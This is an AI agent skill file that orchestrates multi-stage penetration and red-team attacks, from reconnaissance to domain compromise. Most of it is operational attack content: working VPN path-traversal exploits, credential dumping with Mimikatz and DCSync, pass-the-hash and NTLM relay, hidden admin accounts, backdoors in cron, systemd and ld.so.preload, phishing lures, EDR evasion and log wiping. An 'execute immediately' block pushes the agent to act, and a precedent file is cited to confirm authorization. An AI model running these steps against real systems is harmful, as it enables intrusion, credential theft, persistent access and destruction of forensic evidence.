---
name: attack-chain
description: Use for authorized multi-stage attack-path planning and orchestration when a task spans reconnaissance, initial access, privilege escalation, lateral movement, or impact assessment. Route single-stage tasks directly to their specialist skill.
---

## Agent summary

Use this specialist workflow only after the master router and case scope gate are satisfied. Prefer the tools and references named in this file. Follow ACTION REQUIRED in order, keep all activity within the approved scope, and report conclusions as Evidence -> Finding -> Path.
# Attack Chain Orchestration Skill

## ACTION REQUIRED (execute immediately after reading)

1. `NOW`: Read `../field-journal/precedent-pentest.md` — confirm this skill's actions are authorized routine operations
2. `NOW`: **Create/update the case** (`../scripts/case-init.ps1`) and complete `scope.md` (`../ops/scope-contract.md`); `auth.status!=granted` prohibits ACT
3. `NOW`: Plan the phases in the **lead** role (`../ops/role-map.md`) and write `specialist_roles`
4. `NEXT`: Read `../tool-index.md` and verify tool availability and actual paths
5. `NEXT`: Invoke bootstrap when a tool is missing; do not guess paths
6. `ACT`: Pass phase gates according to `references/lifecycle-checklist.md`; update `timeline.md` + `workitems.md` each phase (`../ops/timeline-workitem.md`); elevate discoveries to Evidence/Finding
7. End: the `docs-generator` report must include an Evidence chain

> The coordinator for multi-stage attack-path planning and execution. When a task requires a complete chain "from A to B", this skill orchestrates phases, coordinates subskills, and plans the attack path.
> It is not "red-team only"—any penetration scenario requiring cross-phase composition starts here.

---

## When to Route to This Skill

The following scenarios **must** pass through this skill for end-to-end planning before distribution to specialist skills:

| Scenario | Why orchestration is required |
|------|--------------|
| "Perform a complete penetration test" | Requires planning the full workflow from reconnaissance through reporting |
| "Reach the domain controller from the external network" | Crosses multiple phases: initial access → privilege escalation → lateral movement → AD |
| "HW red-team exercise" | Requires a complete attack chain + stealth + artifact cleanup |
| "Assess this target's attack surface" | Requires multidimensional reconnaissance + path planning |
| "I obtained a webshell; what next?" | Requires planning the next path from the current foothold |
| "Help me plan an attack path" | Explicitly requires path orchestration |
| "How far can this vulnerability get me?" | Requires assessing the vulnerability's chained exploitation value |
| "Continuous Bug Bounty monitoring" | Requires an automated multi-stage workflow |
| "Complete internal-network penetration workflow" | Combines lateral movement + privilege escalation + domain attacks |
| "Near-source penetration plan" | Combines physical access + internal-network penetration |
| "Supply-chain attack path" | Multi-hop attacks across organizations |
| "Phishing + post-exploitation" | Initial access + follow-on exploitation |

**Single-stage tasks do not need this skill**:
- Port scanning only → go directly to `pentest-tools/`
- SQL injection only → go directly to `pentest-tools/`
- APK reverse engineering only → go directly to `apk-reverse/`
- Domain penetration only → go directly to `windows-ad/SKILL.md`

---

## Orchestration Principles

### Role of This Skill

```
User submits a multi-stage task
    ↓
attack-chain/SKILL.md (this file)
    ↓ Plan the attack path and determine phase order
    ↓ Assess the tools and methods required for each phase
    ↓
Distribute execution to specific subskills:
    ├── pentest-tools/     → Tool invocation and vulnerability exploitation
    ├── apk-reverse/       → Mobile penetration testing
    ├── js-reverse/        → Web front-end compromise
    ├── reverse-engineering/ → Binary analysis
    ├── ida-reverse/       → In-depth reverse engineering
    └── browser-automation/ → Automated operations
    ↓
Return to this skill after each phase to assess the next step
    ↓
All phases complete → docs-generator generates the report
```

### Path-Planning Decision Tree

```
After obtaining the target:
1. What is the target? (Web/internal network/cloud/mobile/IoT)
2. What is currently available? (external perspective/existing credentials/existing foothold)
3. What is the ultimate objective? (domain controller/data/specific system/proof of impact)
4. What are the constraints? (time/stealth/systems that must not be touched)
    ↓
Plan the shortest path based on the information above
    ↓
If one path fails → return to this skill and replan an alternative
```

---

## Complete Attack-Chain Phases

---

## I. Reconnaissance Phase

### 1.1 Corporate Digital Asset Mapping

```bash
# Discover domains associated with subsidiaries
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -passive -o amass_results.txt

# Merge and deduplicate
cat subdomains.txt amass_results.txt | sort -u > all_subs.txt

# Probe for live hosts
httpx -l all_subs.txt -status-code -title -tech-detect -o alive.txt

# Port scan (all ports)
naabu -l all_subs.txt -top-ports 1000 -o ports.txt
nmap -sV -sC -iL targets.txt -oA nmap_results
```

**Practical points**:
- Obtain a subsidiary list through Qichacha/Tianyancha to expand the attack surface
- Focus on test environments (test., dev., staging.) and newly deployed systems
- Find hidden domains in certificate transparency logs (crt.sh)

### 1.2 Sensitive Information Leak Hunting

```bash
# GitHub search
# org:Company filename:.env password
# org:Company filename:config.yml secret
# org:Company "jdbc:mysql" password

# Google Dork
# site:target.com filetype:sql
# site:target.com inurl:admin
# site:target.com ext:conf|cfg|ini

# API keys in JS files
cat js_urls.txt | while read url; do
  curl -s "$url" | grep -oP '(api[_-]?key|secret|token|password)\s*[:=]\s*["\047][^"\047]+'
done
```

**High-value targets**:
- Cloud service AK/SK (Alibaba Cloud, AWS, Azure)
- Database connection strings
- JWT signing keys
- Internal API documentation
- VPN/jump-server credentials

### 1.3 Employee Profile Mapping

**Social-engineering dictionary generation rules**:
```
{pinyin_name}{year}       → zhangsan2024
{initials}{department_abbreviation}  → zs_dev
{employee_id}@{domain}          → 10086@target.com
{name}{common_suffix}       → zhangsan@123, zhangsan!@#
```

**Information sources**:
- Maimai/LinkedIn department structures
- Company public accounts/official website team pages
- Job postings (technology-stack exposure)
- Academic papers (email exposure)

### 1.4 Technology Stack Fingerprinting

```bash
# Web fingerprinting
whatweb -i alive.txt --log-json=fingerprint.json
httpx -l alive.txt -tech-detect -json -o tech.json

# Detect specific frameworks
nuclei -l alive.txt -tags tech -severity info -o tech_results.txt

# CMS identification
wpscan --url https://target.com --enumerate p,t,u
```

---

## II. Initial Access Phase

### 2.1 Web Exploitation (Common Entry Points)

| Vulnerability Type | Detection Tool | Exploitation Method |
|---------|---------|---------|
| SQL injection | sqlmap | Data extraction → write shell → OS command |
| SSTI | sstimap | Template injection → RCE |
| File upload | Manual + Burp | Webshell → reverse shell |
| Deserialization | ysoserial/marshalsec | Java/PHP/Python RCE |
| SSRF | Manual | Internal-network probing → cloud metadata → AK/SK |
| Unauthenticated access | nuclei | Spring Actuator / Nacos / Redis |
| XSS → Cookie | xsstrike | Administrator session hijacking |

```bash
# Automated SQL injection
sqlmap -u "https://target.com/api?id=1" --batch --dbs --random-agent

# SSTI detection
sstimap -u "https://target.com/search?q=test"

# Nuclei batch scanning
nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
```

### 2.2 Supply-Chain Attacks

**Attack path**:
1. Identify the third-party components/service providers used by the target
2. Compromise a supplier to obtain code-signing or update-distribution permissions
3. Deliver a malicious payload through a legitimate update channel

**Common entry points**:
- Open-source component poisoning (npm/pip/maven)
- SaaS provider API abuse
- Exploitation of outsourced personnel privileges
- Lateral penetration through shared IT service providers

### 2.3 Phishing Attacks

**Email phishing**:
```
Subject templates:
- [Urgent] VPN certificate is about to expire; update immediately
- [IT Notice] Mailbox storage is insufficient; clean it up
- [HR] 2024 annual performance review results
- [Finance] Expense system upgrade; log in again to confirm
```

**Payload types**:
- Office macro documents (.docm/.xlsm)
- LNK shortcuts (disguised as PDFs)
- HTML smuggling (HTML Smuggling)
- ISO/IMG images (bypassing MOTW)
- OneNote embedded scripts

**OAuth phishing** (new trend in 2025):
- Craft a malicious OAuth app permission request
- Obtain email/file access after user authorization
- Bypass MFA without a password

### 2.4 Near-Source Penetration (Physical Access)

| Technique | Tool | Effect |
|------|------|------|
| BadUSB | Rubber Ducky / WiFi Ducky | Keyboard injection → reverse shell |
| Malicious power bank | O.MG Cable | Implant a backdoor in a disguised data cable |
| WiFi phishing | Fluxion / WiFi Pineapple | Fake access point → credential capture |
| RFID cloning | Proxmark3 | Access-card cloning → physical entry |
| Network implant | Raspberry Pi / LAN Turtle | Persistent internal-network access point |

```bash
# Fluxion WiFi phishing
fluxion  # Interactively select a target AP → create a fake access point → capture the WPA password

# BadUSB with Cobalt Strike
# Inject a PowerShell downloader through USB → connect to C2
```

### 2.5 VPN/Remote Access Compromise

```bash
# Pulse Secure VPN (CVE-2019-11510)
curl -k "https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../etc/passwd?/dana/html5acc/guacamole/"

# Fortinet VPN (CVE-2018-13379)
curl -k "https://vpn.target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# Generic: password spraying
hydra -L users.txt -P passwords.txt vpn.target.com https-form-post
```

### 2.6 Cloud Service Compromise

```bash
# AWS S3 bucket enumeration
aws s3 ls s3://target-bucket --no-sign-request

# Cloud metadata SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure AD password spraying
# Use the MSOLSpray / Spray tools
```

---

## III. Privilege Escalation Phase

### 3.1 Windows Privilege Escalation

| Technique | Condition | Tool |
|------|------|------|
| Potato family | SeImpersonate privilege | SweetPotato / GodPotato / PrintSpoofer |
| Kernel vulnerabilities | Unpatched system | watson / wesng detection |
| Service path hijacking | Unquoted service path | PowerUp |
| DLL hijacking | Writable DLL search path | Process Monitor |
| AlwaysInstallElevated | Registry configuration | msiexec installs a malicious MSI |
| Scheduled tasks | Writable task script | schtasks replacement |

```powershell
# Detect SeImpersonate
whoami /priv | findstr "SeImpersonate"

# Potato privilege escalation
.\GodPotato.exe -cmd "cmd /c whoami"

# Automated detection
.\winPEAS.exe
```

### 3.2 Linux Privilege Escalation

```bash
# SUID detection
find / -perm -4000 -type f 2>/dev/null

# sudo abuse
sudo -l
# Commonly exploitable: vim, find, python, nmap, less, awk, perl

# sudo vim privilege escalation
sudo vim -c ':!/bin/bash'

# sudo find privilege escalation
sudo find / -exec /bin/bash \;

# Kernel vulnerabilities
uname -r  # Check the version
# DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)

# Automated detection
./linpeas.sh
```

### 3.3 Database Privilege Escalation

```sql
-- MSSQL xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- MySQL UDF privilege escalation
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'id';
```

### 3.4 Cloud Privilege Escalation

```bash
# AWS IAM enumeration
aws iam list-attached-user-policies --user-name compromised-user
# Look for iam:PassRole + lambda:CreateFunction → administrator privileges

# Azure AD
# Global administrator → control of all subscriptions
# Application administrator → add credentials to a service principal
```

---

## IV. Lateral Movement Phase

### 4.1 Credential Access

```bash
# Mimikatz (Windows)
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::dcsync /domain:target.local /user:krbtgt

# Linux credentials
cat /etc/shadow
cat ~/.bash_history | grep -i pass
find / -name "*.conf" -exec grep -l "password" {} \;

# NTLM hash extraction
secretsdump.py domain/user:password@dc_ip
```

### 4.2 Pass-the-Hash / Pass-the-Ticket

```bash
# PTH lateral movement
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM_HASH> --exec-method smbexec

# Kerberoasting
GetUserSPNs.py -request -dc-ip 10.0.0.1 domain/user:password

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

# Golden Ticket
mimikatz# kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt
```

### 4.3 Stealthy Lateral Movement Techniques

```bash
# Fileless WMI execution
wmiexec.py domain/admin:password@target_ip "whoami"

# DCOM remote execution
dcomexec.py domain/admin:password@target_ip "whoami"

# WinRM
evil-winrm -i target_ip -u admin -H <NTLM_HASH>

# PsExec (leaves artifacts)
psexec.py domain/admin:password@target_ip

# SSH tunneling (Linux environment)
ssh -D 1080 user@pivot_host  # SOCKS proxy
ssh -L 3389:internal_host:3389 user@pivot_host  # Port forwarding
```

### 4.4 NTLM Relay

```bash
# Disable Responder's SMB/HTTP
# Edit Responder.conf: SMB = Off, HTTP = Off

# Start Responder capture
responder -I eth0

# NTLM relay to target
ntlmrelayx.py -tf targets.txt -smb2support

# Coercer forced authentication
coercer coerce -u user -p password -d domain -l attacker_ip -t dc_ip
```

### 4.5 AD Attack Paths

```bash
# BloodHound data collection
bloodhound-python -d domain.local -u user -p password -c All -ns dc_ip

# Common attack paths:
# 1. User → GenericAll → target user → reset password
# 2. User → WriteDacl → target OU → add permissions
# 3. Computer → constrained delegation → impersonate any user
# 4. User → DCSync privilege → export all hashes

# Certipy AD CS attack
certipy find -u user@domain -p password -dc-ip dc_ip
certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate
```

---

## V. Persistence Phase

### 5.1 Windows Persistence

| Technique | Stealth | Detection Difficulty |
|------|:---:|:---:|
| Scheduled tasks | Medium | Low |
| Registry Run key | Low | Low |
| WMI event subscription | High | High |
| DLL hijacking | High | Medium |
| Shadow account | Medium | Medium |
| Golden Ticket | Very high | Very high |
| DSRM backdoor | Very high | Very high |

```powershell
# WMI event subscription (high stealth)
$Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = "CoreFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Shadow account
net user support$ P@ssw0rd /add /active:yes
net localgroup administrators support$ /add
# Modify the registry F value to clone the RID
```

### 5.2 Linux Persistence

```bash
# SSH key injection
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Crontab backdoor
(crontab -l; echo "*/5 * * * * /tmp/.hidden/beacon") | crontab -

# LD_PRELOAD hijacking
echo "/tmp/.hidden/evil.so" > /etc/ld.so.preload

# PAM backdoor
# Modify pam_unix.so to add a universal password

# Systemd service
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/.hidden/beacon
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
```

### 5.3 Cloud Environment Persistence

```bash
# AWS Lambda backdoor
# Create a periodically triggered Lambda function that calls back to C2

# Azure AD application registration
# Create an application → add a secret credential → grant Graph API permissions

# Container backdoor
# Modify the base image → all new containers include the backdoor
```

---

## VI. EDR/AV Evasion

### 6.1 Core Evasion Concepts

| Layer | Technique | Description |
|------|------|------|
| Static detection | Encryption/obfuscation/custom loader | Avoid signature matching |
| Behavioral detection | Indirect system calls/Unhooking | Bypass API hooks |
| Memory detection | Module stomping/heap encryption | Avoid memory scanning |
| Network detection | Domain fronting/legitimate service tunneling | Blend into normal traffic |
| Log detection | ETW patching/log clearing | Reduce artifacts |

### 6.2 Practical Evasion Techniques

```
1. Customize the shellcode loader (do not use public tools)
2. Invoke system calls directly (bypass ntdll hooks)
3. Inject into a low-monitoring process (such as RuntimeBroker.exe)
4. Route C2 traffic through HTTPS + domain fronting / Cloudflare Workers
5. Execute in memory without writing to disk (Fileless)
6. Load through legitimately signed programs (LOLBins)
```

### 6.3 C2 Framework Selection

| Framework | Characteristics | Use Case |
|------|------|---------|
| Cobalt Strike | Mature and stable, team collaboration | Large red-team operations |
| Sliver | Open source, written in Go | Limited budget |
| Havoc | Modern, modular | Customization required |
| Mythic | Multi-agent support | Cross-platform |
| AdaptixC2 | Included in Kali 2026.1 | Rapid deployment |

---

## VII. Artifact Cleanup (Anti-Forensics)

```bash
# Clear Windows logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Clear Linux logs
echo > /var/log/auth.log
echo > /var/log/syslog
history -c && history -w

# Modify timestamps
touch -t 202301010000 /path/to/file

# Memory cleanup
# Ensure the Mimikatz dump has been deleted
# Ensure the C2 beacon has exited
# Ensure temporary files have been cleared
```

---

## Red-Team Rules of Engagement

### Three Non-Negotiables

1. **All operations must have written authorization**
2. **Exfiltrated data must be anonymized**
3. **Clean up all attack artifacts (including resident memory)**

### Operational Discipline

- Assess the risk level (low/medium/high/critical) before every operation
- Notify the project manager before high-risk operations
- Maintain an operation log (time, action, result)
- Report critical vulnerabilities immediately; do not expand exploitation
- Do not affect service availability (DoS is prohibited)
- Do not access or download real user data

### Typical Failure Cases

| Failure Cause | Consequence | Lesson |
|---------|------|------|
| Mimikatz memory dump not cleared | Blue team reconstructed the full attack path | Clean up immediately after operations |
| C2 domain flagged by threat intelligence | Blocked on the first connection | Use a newly registered domain + domain fronting |
| Phishing email triggered a DLP alert | Blue team received advance warning | Test mail-gateway rules |
| Lateral movement triggered a honeypot | Attack intent was exposed | Identify honeypots before acting |

---

## Tool Quick Reference

### Reconnaissance
`subfinder` `amass` `httpx` `naabu` `katana` `gau` `dnsx` `nmap` `whatweb` `wpscan`

### Exploitation
`nuclei` `sqlmap` `sstimap` `xsstrike` `burpsuite` `metasploit`

### Privilege Escalation
`winPEAS` `linpeas` `GodPotato` `PrintSpoofer` `watson`

### Lateral Movement
`mimikatz` `crackmapexec/netexec` `impacket` `bloodhound` `certipy` `coercer` `responder` `evil-winrm`

### C2 Frameworks
`cobalt-strike` `sliver` `havoc` `mythic` `adaptixc2`

### Near-Source Penetration
`fluxion` `aircrack-ng` `proxmark3` `rubber-ducky` `wifi-pineapple`

---

## Relationship to Other Skills in This Package

| Need | Route to |
|------|--------|
| In-depth Web vulnerability exploitation | `pentest-tools/SKILL.md` |
| Detailed internal AD attack steps | `windows-ad/SKILL.md` |
| Reverse analysis of malicious samples | `reverse-engineering/SKILL.md` |
| APK reverse engineering (mobile penetration) | `apk-reverse/SKILL.md` |
| JS front-end signature bypass | `js-reverse/SKILL.md` |
| Automated swarm penetration | Pentest Swarm AI (`pentestswarm scan --swarm`) |
| AI-assisted penetration testing | `mcp-kali-server` / `metasploitmcp` / `hexstrike-ai` |
| Report generation | `docs-generator/SKILL.md` |
| Attack-path diagram | `diagram-generator/SKILL.md` |

## Task Completion Self-Check (MUST pass before claiming completion)

- [ ] Did I execute every step in the workflow (rather than only read it)?
- [ ] Did I use real tool paths based on `tool-index`?
- [ ] Did I produce reproducible evidence (commands/scripts/screenshots/reports)?
- [ ] Did I complete and write back the checklist items required by RULES?
